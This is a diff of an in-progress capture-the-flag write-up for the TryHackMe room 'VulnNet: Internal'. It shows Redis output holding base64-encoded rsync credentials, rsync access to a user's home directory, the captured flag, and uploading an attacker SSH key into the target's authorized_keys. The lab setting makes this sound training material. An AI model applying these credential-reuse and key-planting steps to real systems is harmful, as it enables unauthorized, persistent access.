@@ -5,9 +5,11 @@ March 8, 2025, Day 306
 <h1>VulNet: Internal, In Progress (75%)</h1>
 <p>VulnNet Entertainment learns from its mistakes, and now they have something new for you...</p>
 
-<p align="left"> <img width="800px" src="https://github.com/user-attachments/assets/4af2985e-9405-4eaf-9ffd-d30196198a60"> </p>
+<p align="left"> <img width="800px" src="https://github.com/user-attachments/assets/e04a5b3f-38b5-4add-a08a-198c91295052"> </p>
 
 <br>
+
+
 
 <ul style="list-style-type:square">
     <li>Get  &nbsp; <code>Services Flag</code>  &nbsp; practicing<br>
@@ -477,7 +479,7 @@ Target_IP:6379> GET "internal flag"
 <p>Used redis <code>LRANGE</code> command. It is a command that returns the specified elements of the list stores at the key. The offsets start and stop are zero-based indexes, with 0 being the first element of the list (the head of the list), 1 being the next element, and so on.  These offsets can also be negative numbers indicating offsets starting at the end of the list. For example, -1 is the last element of the list, -2 the penultimate, and so on.</p>
 
 ```bash
-Target_IP:6379> LRANGE authlist 1 100
+Target_IP:6379> LRANGE authlist 1 10
 1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
 2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
 3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
@@ -495,11 +497,28 @@ Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72
 <p>Explored <code>rsync</code>: port 873.</p>
 
 ```bash
-~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files
+~/VulnNetInternal#
+~/VulnNetInternal# rsync authorized_keys rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/
+Password: 
+drwxrwxr-x          4,096 2021/02/06 11:43:14 .
+...
+~/VulnNetInternal# ls
+files
+:~/VulnNetInternal# cd files
+:~/VulnNetInternal/files# dir
+sys-internal
+:~/VulnNetInternal/files# cd sys-internal
+:~/VulnNetInternal/files/sys-internal# dir
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  user.txt  Videos
+:~/VulnNetInternal/files/sys-internal# cat user.txt
+THM{da7c20696831f253e0afaca8b83c07ab}
+:~/VulnNetInternal/files/sys-internal#
+...
+~/VulnNetInternal# rsync rsync://rsync-connect@Target_IP/files
 Password: 
 drwxr-xr-x          4,096 2021/02/01 12:51:14 .
 drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
-~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files/sys-internal/
+:~/VulnNetInternal# rsync rsync://rsync-connect@Target_IP/files/sys-internal/
 Password: 
 drwxr-xr-x          4,096 2021/02/06 12:49:29 .
 -rw-------             61 2021/02/06 12:49:28 .Xauthority
@@ -530,22 +549,8 @@ drwxr-xr-x          4,096 2021/02/01 12:53:22 Pictures
 drwxr-xr-x          4,096 2021/02/01 12:53:22 Public
 drwxr-xr-x          4,096 2021/02/01 12:53:22 Templates
 drwxr-xr-x          4,096 2021/02/01 12:53:22 Videos
-~/VulnNetInternal#
-~/VulnNetInternal# rsync authorized_keys rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/
-Password: 
-drwxrwxr-x          4,096 2021/02/06 11:43:14 .
+:~/VulnNetInternal# rsync -hv user.pub rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/authorized_keys --inplace
 ...
-~/VulnNetInternal# ls
-files
-:~/VulnNetInternal# cd files
-:~/VulnNetInternal/files# dir
-sys-internal
-:~/VulnNetInternal/files# cd sys-internal
-:~/VulnNetInternal/files/sys-internal# dir
-Desktop  Documents  Downloads  Music  Pictures	Public	Templates  user.txt  Videos
-:~/VulnNetInternal/files/sys-internal# cat user.txt
-THM{da7c20696831f253e0afaca8b83c07ab}
-:~/VulnNetInternal/files/sys-internal# 
 ```
 
 <br>
@@ -554,42 +559,6 @@ THM{da7c20696831f253e0afaca8b83c07ab}
 >> <code><strong>____________________________________</strong></code>
 
 <p>Discovered that we have read, write, and execute permission in <code>sys-internal/.ssh</code></p>
-
-```bash
-:~/VulnNetInternal/files/sys-internal# ls -la
-total 108
-drwxr-xr-x 18 ubuntu ubuntu 4096 Feb  6  2021 .
-drwxr-xr-x  3 root   root   4096 Feb  1  2021 ..
-lrwxrwxrwx  1 root   root      9 Feb  1  2021 .bash_history -> /dev/null
--rw-r--r--  1 ubuntu ubuntu  220 Feb  1  2021 .bash_logout
--rw-r--r--  1 ubuntu ubuntu 3771 Feb  1  2021 .bashrc
-drwxrwxr-x  8 ubuntu ubuntu 4096 Feb  2  2021 .cache
-drwxrwxr-x 14 ubuntu ubuntu 4096 Feb  1  2021 .config
-drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .dbus
-drwx------  2 ubuntu ubuntu 4096 Feb  1  2021 Desktop
--rw-r--r--  1 ubuntu ubuntu   26 Feb  1  2021 .dmrc
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Documents
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Downloads
-drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .gnupg
-drwxrwxr-x  3 ubuntu ubuntu 4096 Feb  1  2021 .local
-drwx------  5 ubuntu ubuntu 4096 Feb  1  2021 .mozilla
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Music
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Pictures
--rw-r--r--  1 ubuntu ubuntu  807 Feb  1  2021 .profile
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Public
-lrwxrwxrwx  1 root   root      9 Feb  2  2021 .rediscli_history -> /dev/null
-drwxrwxr-x  2 ubuntu ubuntu 4096 Feb  6  2021 .ssh
--rw-r--r--  1 ubuntu ubuntu    0 Feb  1  2021 .sudo_as_admin_successful
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Templates
-drwx------  4 ubuntu ubuntu 4096 Feb  2  2021 .thumbnails
--rw-------  1 ubuntu ubuntu   38 Feb  6  2021 user.txt
-drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Videos
--rw-------  1 ubuntu ubuntu   61 Feb  6  2021 .Xauthority
--rw-r--r--  1 ubuntu ubuntu   14 Feb 12  2018 .xscreensaver
--rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors
--rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors.old
-:~/VulnNetInternal/files/sys-internal# 
-```
 
 
 <p>Generated <code>VulnNetInternalRSA</code> and <code>VulnNetInternalRSA.pub</code>.</p>
@@ -641,8 +610,45 @@ The key's randomart image is:
 ~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@Target_IP:873/files/sys-internal/.ssh
 ```
 
+```bash
+:~/VulnNetInternal/files/sys-internal# ls -la
+total 108
+drwxr-xr-x 18 ubuntu ubuntu 4096 Feb  6  2021 .
+drwxr-xr-x  3 root   root   4096 Feb  1  2021 ..
+lrwxrwxrwx  1 root   root      9 Feb  1  2021 .bash_history -> /dev/null
+-rw-r--r--  1 ubuntu ubuntu  220 Feb  1  2021 .bash_logout
+-rw-r--r--  1 ubuntu ubuntu 3771 Feb  1  2021 .bashrc
+drwxrwxr-x  8 ubuntu ubuntu 4096 Feb  2  2021 .cache
+drwxrwxr-x 14 ubuntu ubuntu 4096 Feb  1  2021 .config
+drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .dbus
+drwx------  2 ubuntu ubuntu 4096 Feb  1  2021 Desktop
+-rw-r--r--  1 ubuntu ubuntu   26 Feb  1  2021 .dmrc
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Documents
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Downloads
+drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .gnupg
+drwxrwxr-x  3 ubuntu ubuntu 4096 Feb  1  2021 .local
+drwx------  5 ubuntu ubuntu 4096 Feb  1  2021 .mozilla
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Music
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Pictures
+-rw-r--r--  1 ubuntu ubuntu  807 Feb  1  2021 .profile
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Public
+lrwxrwxrwx  1 root   root      9 Feb  2  2021 .rediscli_history -> /dev/null
+drwxrwxr-x  2 ubuntu ubuntu 4096 Feb  6  2021 .ssh
+-rw-r--r--  1 ubuntu ubuntu    0 Feb  1  2021 .sudo_as_admin_successful
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Templates
+drwx------  4 ubuntu ubuntu 4096 Feb  2  2021 .thumbnails
+-rw-------  1 ubuntu ubuntu   38 Feb  6  2021 user.txt
+drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Videos
+-rw-------  1 ubuntu ubuntu   61 Feb  6  2021 .Xauthority
+-rw-r--r--  1 ubuntu ubuntu   14 Feb 12  2018 .xscreensaver
+-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors
+-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors.old
+:~/VulnNetInternal/files/sys-internal# 
+```
 
-<h2> To be continued ...</h2>
+
+
+<h2> Need to write the last part ...</h2>
 
 <br>
 <br>
@@ -650,10 +656,15 @@ The key's randomart image is:
 <h2>My journey on TryHackMe</h2>
 
 ```
-306 days streak 🎉 ▪ 85,747 points ▪ 607 rooms completed ▪ 59 badges🎖️
-Global ranking:    365ᵗʰ all time    ▪    391st monthly
+306 days streak 🎉 ▪ 85,777 points ▪ 608 rooms completed ▪ 59 badges🎖️
+Global ranking:    365ᵗʰ all time    ▪    381st monthly
 Brazil ranking:      8ᵗʰ all time    ▪      7ᵗʰ monthly
 ```
+
+<br>
+
+![image](https://github.com/user-attachments/assets/5d25c563-aef9-4fce-8f7d-fe252a65f5a4)
+
 
 <br>
 
@@ -663,19 +674,27 @@ https://github.com/user-attachments/assets/1fa772ca-0cab-4e6a-9d75-c77dfa8946e0
 
 <br>
 
-<p>Brazil all time ranking: 8ᵗʰ</p>
+![image](https://github.com/user-attachments/assets/b54c84e5-9d3f-4348-ad92-4718398510d7)
 
-![image](https://github.com/user-attachments/assets/95ae7958-50e4-4010-b08e-acbaee957d0e)
 
 <br>
 
-<p>Global monthly ranking: 391st</p>
+<p>Brazil all time ranking: 8ᵗʰ</p>
 
-![image](https://github.com/user-attachments/assets/cddde77c-3fc2-4de1-aca4-8e3c0a90cf73)
+![image](https://github.com/user-attachments/assets/d353760a-c4ba-4df2-86eb-4299401ea215)
+
+
+<br>
+
+<p>Global monthly ranking: 381st</p>
+
+![image](https://github.com/user-attachments/assets/439ff06c-6edc-4f18-b472-b7e9d370f928)
+
 
 <br>
 
 <p>Brazil monthly ranking: 7ᵗʰ</p>
 
-![image](https://github.com/user-attachments/assets/7997d7c7-d2ca-4a5c-bbff-c0e1fed77781)
+![image](https://github.com/user-attachments/assets/9a75ce88-3623-4c27-9e33-9197cc288ce8)
+
 
